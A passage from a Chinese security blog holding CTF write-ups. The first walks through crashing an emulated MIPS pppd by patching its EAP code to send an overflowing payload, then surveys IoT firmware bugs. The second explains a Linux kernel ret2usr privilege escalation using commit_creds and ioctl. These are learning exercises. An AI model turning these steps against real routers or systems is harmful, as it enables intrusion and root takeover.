<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>

<p>（2）编辑<code>etc/inittab</code></p>
<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>

<p>（3）修改<code>start.sh</code>文件</p>
<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
<p>（5）重新打包<code>rootfs.img</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>

<p>（6）运行</p>
<p><code>./start.sh</code></p>
<p><img src="/2020/10/22/01-08-undefined/image-20200830122145171.png" alt="image-20200830122145171"></p>
<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>

<p>再打开一个新的窗口</p>
<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>

<p>接着</p>
<p>（1）下载ppp的源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>

<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>

<p>修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>

<p>（3）编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>

<p>（4）在本地机器运行patched <code>pppd</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>

<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
<p><img src="/2020/10/22/01-08-undefined/image-20200830154226602.png" alt="image-20200830154226602"></p>
<p>获取flag：</p>
<p>方法一：</p>
<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
<p>方法二：</p>
<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
<p>参考：</p>
<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
<p>考点：</p>
<ol>
<li>mips 堆溢出利用；</li>
<li>uClibc 堆管理机制。 </li>
</ol>
<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
<p><img src="/2020/10/22/01-08-undefined/image-20200830015127901.png" alt="image-20200830015127901"></p>
<p>DLINK DIR-815 路由器前台栈溢出</p>
<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
<ul>
<li>DLINK DIR-859 upnp 协议命令注入</li>
<li>tplink sr20 路由器命令注入</li>
<li>Draytek Vigor2960 前台登录处栈溢出</li>
</ul>
<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
<p>TPLINK WR841n 路由器后台栈溢出</p>
<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
<p>命令注入</p>
<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
<hr>
<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
<p><img src="/2020/10/22/01-08-undefined/image-20200829204006754.png" alt="image-20200829204006754"></p>
<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/00-32-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/22/00-32-undefined/" class="post-title-link" itemprop="url">ret2usr</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-22 00:32:16" itemprop="dateCreated datePublished" datetime="2020-10-22T00:32:16+08:00">2020-10-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:58:14" itemprop="dateModified" datetime="2021-04-20T16:58:14+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/advanced-pwn/" itemprop="url" rel="index"><span itemprop="name">advanced pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>适合人群：内核基础为0</p>
<h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><p>基础知识：</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/</a></p>
<p><a href="https://xz.aliyun.com/t/7625#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7625#toc-10</a></p>
<h4 id="copy-from-user"><a href="#copy-from-user" class="headerlink" title="copy_from_user"></a>copy_from_user</h4><p>copy_from_user(void *to, const void __user *from, unsigned long n)</p>
<p>（1）to：将数据拷贝到<strong>内核地址</strong> </p>
<p>（2）from：需要拷贝数据的<strong>用户地址</strong></p>
<p>（3）n：拷贝数据的长度（字节）</p>
<blockquote>
<p>也就是将form用户地址中的数据拷贝到to内核地址中去，拷贝长度是n</p>
</blockquote>
<h4 id="cpio解压和打包"><a href="#cpio解压和打包" class="headerlink" title="cpio解压和打包"></a>cpio解压和打包</h4><p>解压：cpio -idvm &lt; ../initramfs.cpio<br>打包：find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>调试，<code>startvm.sh</code>末尾加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp::1234 -S</span><br></pre></td></tr></table></figure>

<p>【注：上一行后面还要加上’ \ ‘，不然的话，远程调试可能端口没开，连不上】</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903111140398.png" alt="image-20200903111140398"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h4 id="ret2usr（level1）"><a href="#ret2usr（level1）" class="headerlink" title="ret2usr（level1）"></a>ret2usr（level1）</h4><p>说明：参考<code>Linux Kernel Pwn 初探</code>,主要加上具体的一些细节</p>
<h5 id="查找prepare-kernel-cred和commit-creds的地址"><a href="#查找prepare-kernel-cred和commit-creds的地址" class="headerlink" title="查找prepare_kernel_cred和commit_creds的地址"></a>查找prepare_kernel_cred和commit_creds的地址</h5><pre><code>$ grep prepare_kernel_cred  /proc/kallsyms 
$ grep commit_creds  /proc/kallsyms </code></pre><p><img src="/2020/10/22/00-32-undefined/image-20200903105056015.png" alt="image-20200903105056015"></p>
<p>但是直接执行，地址都是0x0，需要root权限。</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903105223481.png" alt="image-20200903105223481"></p>
<p>方法：修改suid</p>
<p>（1）创建一个文件夹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir myimage</span><br><span class="line">$ cd myimage</span><br></pre></td></tr></table></figure>

<p>（2）解压initramfs.cpio文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idvm &lt; ..&#x2F;initramfs.cpio</span><br></pre></td></tr></table></figure>

<p>（3）修改suid</p>
<p>进入etc/init.d/rcS，将1000修改为0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1&#x2F;myimage$ gedit etc&#x2F;init.d&#x2F;rcS</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/22/00-32-undefined/image-20200903110009863.png" alt="image-20200903110009863"></p>
<p>（4）重新打包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">level1&#x2F;myimage$ find . | cpio -H newc -o &gt; ..&#x2F;initramfs.cpio</span><br><span class="line">level1&#x2F;myimage$ cd ..</span><br></pre></td></tr></table></figure>

<p>（5）再次执行两条命令即可</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903110203208.png" alt="image-20200903110203208"></p>
<p>已经是root权限了</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903110251793.png" alt="image-20200903110251793"></p>
<p><code>prepare_kernel_cred</code>的地址为<code>0xffffffff810b9d80</code></p>
<p><code>commit_creds</code>的地址为<code>0xffffffff810b99d0</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; # grep prepare_kernel_cred  &#x2F;proc&#x2F;kallsyms </span><br><span class="line">ffffffff8109a620 T prepare_kernel_cred</span><br><span class="line">ffffffff81b72650 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff81b89b07 r __kstrtab_prepare_kernel_cred</span><br><span class="line">&#x2F; # grep commit_creds  &#x2F;proc&#x2F;kallsyms </span><br><span class="line">ffffffff8109a250 T commit_creds</span><br><span class="line">ffffffff81b69b00 R __ksymtab_commit_creds</span><br><span class="line">ffffffff81b89b43 r __kstrtab_commit_creds</span><br><span class="line">&#x2F; # cat &#x2F;proc&#x2F;modules </span><br><span class="line">rootme 1616 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">.&#x2F;sys&#x2F;module&#x2F;rootme</span><br><span class="line">.&#x2F;proc&#x2F;rootme</span><br></pre></td></tr></table></figure>



<blockquote>
<p>疑问解答：此时已经获得root权限了，不就可以直接cat /flag了？</p>
<p>实际题目中，不会把真的flag放文件里给你，而是在远程环境了。但是本地的地址和远程的地址是一样的，所以，可以通过这种方法得到本地的用户权限，找到prepare_kernel_cred和commit_creds的地址，但是没有办法直接获得flag。</p>
</blockquote>
<h5 id="查找基地址"><a href="#查找基地址" class="headerlink" title="查找基地址"></a>查找基地址</h5><p>以root权限运行，参考上面（修改etc/init.d/rcS）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;pwn # cat &#x2F;proc&#x2F;modules </span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure>

<h5 id="调试内核"><a href="#调试内核" class="headerlink" title="调试内核"></a>调试内核</h5><p>（1）编辑startvm.sh，端口可以修改</p>
<p>0x7ffd958d7e08</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200905004851358.png" alt="image-20200905004851358"></p>
<p>（2）执行<code>./startvm.sh</code></p>
<p>（3）打开新窗口，在<code>level1</code>目录下执行<code>gdb exp</code></p>
<p>（4）远程连接，<code>target remote :1234</code></p>
<p>（5）下断点（ida里面的地址+基地址），继续执行</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200905103517562.png" alt="image-20200905103517562"></p>
<p><img src="/2020/10/22/00-32-undefined/image-20200905103116021.png" alt="image-20200905103116021"></p>
<p>（6）在原来的窗口，执行exp</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200905103146690.png" alt="image-20200905103146690"></p>
<p>（7）接着，就可以正常调试了</p>
<h5 id="执行exp步骤"><a href="#执行exp步骤" class="headerlink" title="执行exp步骤"></a>执行exp步骤</h5><p>（1）编译exp.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc exp.c -o exp -w -static -fPIC</span><br><span class="line">cd myimage&#x2F;</span><br></pre></td></tr></table></figure>

<p>（2）将initramfs.cpio解压到myimage文件夹</p>
<p>find . | cpio -H newc -o &gt; ../initramfs.cpio</p>
<p>（3）将exp移入myimage文件夹下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exp myimage&#x2F;</span><br></pre></td></tr></table></figure>

<p>（4）重新打包，执行./startvm.sh</p>
<p>exp已在/目录下了</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903111831663.png" alt="image-20200903111831663"></p>
<h5 id="疑惑的0x88和0x80"><a href="#疑惑的0x88和0x80" class="headerlink" title="疑惑的0x88和0x80"></a>疑惑的0x88和0x80</h5><p>一开始，说将<code>0x100</code>的用户数据拷贝到内核栈上，高度只有<code>0x88</code>，后面又说实际上缓冲区距离<code>rbp</code>是<code>0x80</code>，有点迷。</p>
<p>一开始的0x88，指的是初始化的时候。</p>
<p>但是程序初始化的时候，有个压栈操作，所以少减了一个8</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200903112746033.png" alt="image-20200903112746033"></p>
<h5 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h5><p>init_module是内核加载模块的时候调用的</p>
<p>开始的时候（内核加载模块）：调用init_module</p>
<p>中间的时候：</p>
<p>我们调用ioctl调用了sub_0函数</p>
<p>ioctl的参数就是sub_0的参数</p>
<p><img src="/2020/10/22/00-32-undefined/image-20200905120014834.png" alt="image-20200905120014834"></p>
<p><code>return (signed int)copy_from_user(&amp;v4, v2, 256LL);</code></p>
<p>我们通过buf覆盖栈上的返回地址，执行v2中copy过去的templine函数，获得shell</p>
<p>结束的时候：cleanup_module</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Shuwen"
      src="/images/shuwen.jpg">
  <p class="site-author-name" itemprop="name">Shuwen</p>
  <div class="site-description" itemprop="description">做有意思的事，有意思地做事</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/warm-winter" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;warm-winter" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://kaaass.net/" title="https:&#x2F;&#x2F;kaaass.net&#x2F;" rel="noopener" target="_blank">KAAAsS</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shuwen</span>
</div>
	<div class="powered-by">
		<i class="fa fa-user-md"></i>
		<span id="busuanzi_container_site_uv">
		  本站访客数:<span id="busuanzi_value_site_uv"></span>
		</span>
	</div>

  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>


        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
